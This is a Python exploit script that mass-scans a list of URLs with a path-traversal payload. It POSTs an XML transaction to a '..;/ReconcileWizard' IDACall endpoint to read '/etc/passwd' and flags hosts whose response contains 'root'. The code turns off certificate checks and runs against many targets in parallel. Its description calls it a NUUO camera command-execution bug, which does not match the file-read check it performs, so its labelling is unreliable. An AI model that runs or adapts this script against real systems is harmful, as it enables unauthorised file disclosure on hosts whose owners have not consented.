import requests, sys, argparse
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool
def main():
    parse = argparse.ArgumentParser(description="NUUO摄像头命令执行漏洞")
    # 添加命令行参数
    parse.add_argument('-u', '--url', dest='url', type=str, help='Please input url')
    parse.add_argument('-f', '--file', dest='file', type=str, help='Please input file')
    # 实例化
    args = parse.parse_args()
    pool = Pool(2)
    if args.url:
        if 'http' in args.url:
            check(args.url)
        else:
            target = f"http://{args.url}"
            check(target)
    elif args.file:
        f = open(args.file, 'r+')
        targets = []
        for target in f.readlines():
            target = target.strip()
            if 'http' in target:
                targets.append(target)
            else:
                target = f"http://{target}"
                targets.append(target)
        pool.map(check, targets)
        pool.close()
def check(target):
    target = f"{target}/npm-pwg/..;/ReconcileWizard/reconcilewizard/sc/IDACall?isc_rpc=1&isc_v&isc_tnum=2"
    headers = {
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Content-Type':'application/x-www-form-urlencoded'
    }
    data = {
        "_transaction": "<transaction xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:type=\"xsd:Object\">"
                        "<transactionNum xsi:type=\"xsd:long\">2</transactionNum>"
                        "<operations xsi:type=\"xsd:List\">"
                        "<elem xsi:type=\"xsd:Object\">"
                        "<criteria xsi:type=\"xsd:Object\">"
                        "<reportName>../../../etc/passwd</reportName>"
                        "</criteria>"
                        "<operationConfig xsi:type=\"xsd:Object\">"
                        "<dataSource>summary_reports</dataSource>"
                        "<operationType>fetch</operationType>"
                        "</operationConfig>"
                        "<appID>builtinApplication</appID>"
                        "<operation>downloadReport</operation>"
                        "<oldValues xsi:type=\"xsd:Object\">"
                        "<reportName>x.txt</reportName>"
                        "</oldValues>"
                        "</elem>"
                        "</operations>"
                        "<jscallback>x</jscallback>"
                        "</transaction>"
            }
    try:
        response = requests.post(target, headers=headers, data=data,verify=False, timeout=5)
        if response.status_code == 200 and 'root' in response.text:
            print(f"[*] {target}存在任意文件读取")
        else:
            print(f"[!] {target} 不存在任意文件读取")
    except Exception as e:
            print(f"[Error] {target} TimeOut")
if __name__ == '__main__':
    main()






